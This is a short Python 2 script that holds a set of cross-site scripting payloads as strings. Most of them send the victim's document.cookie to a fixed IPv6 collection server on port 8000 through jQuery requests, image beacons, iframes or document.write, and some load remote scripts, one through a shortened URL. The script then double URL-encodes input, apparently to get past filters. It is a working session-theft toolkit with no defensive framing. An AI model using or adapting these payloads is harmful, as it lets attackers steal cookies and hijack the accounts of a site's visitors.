import binascii


def split_by_n( seq, n ):
    """A generator to divide a sequence into chunks of n units."""
    while seq:
        yield seq[:n]
        seq = seq[n:]

payload = "<script src='http://goo.gl/8LXprn'></script><script>$.get('http://[2001:470:b2b5:2018:a1d1:fe90:1cea:2b33]:8000', {cookies:document.cookie})</script>"
s = '<script>var img=document.createElement("img");img.src="http://[2001:470:b2b5:2018:a1d1:fe90:1cea:2b33]:8000/"+encodeURIComponent(document.cookie);img.width=1;img.height=1;document.body.appendChild(img)</script>'

s2 = '<script>document.write("<img src=\'http://[2001:470:b2b5:2018:a1d1:fe90:1cea:2b33]:8000/\'/>")</script>'
s3 = '<script>document.write("<img src=\'http://[2001:470:b2b5:2018:a1d1:fe90:1cea:2b33]:8000/" +encodeURIComponent(document.cookie)+"\'/>")</script>'

s4 = '<script>document.write("<iframe src=\'http://[2001:470:b2b5:2018:a1d1:fe90:1cea:2b33]:8000/" +encodeURIComponent(document.cookie)+"\'></iframe>")</script>'
s5 = '<img src="http://[2001:470:b2b5:2018:a1d1:fe90:1cea:2b33]:8000/"/>'


s6 = '''
<script>document.write('<img src="http://[2001:470:b2b5:2018:a1d1:fe90:1cea:2b33]:8000/"/>')</script>
'''

s7 = '''
<script>var c=atob(document.cookie);document.write('<img src="http://[2001:470:b2b5:2018:a1d1:fe90:1cea:2b33]:8000/'+c+'"/>')</script>
'''

s8 = '''
<script>document.addEventListener("DOMContentLoaded", function(e){var c=encodeURIComponent(document.cookie);var img=document.createElement("img");img.src="http://[2001:470:b2b5:2018:a1d1:fe90:1cea:2b33]:8000/"+c;img.width=1;img.height=1;document.body.appendChild(img))})</script>
'''
s9 = '''
<script src="http://[2001:470:b2b5:2018:a1d1:fe90:1cea:2b33]:8888/"></script>
'''
s10 = 'a'

hex = binascii.hexlify(s10)
print hex

print "%25" + "%25".join(list(split_by_n(hex,2)))
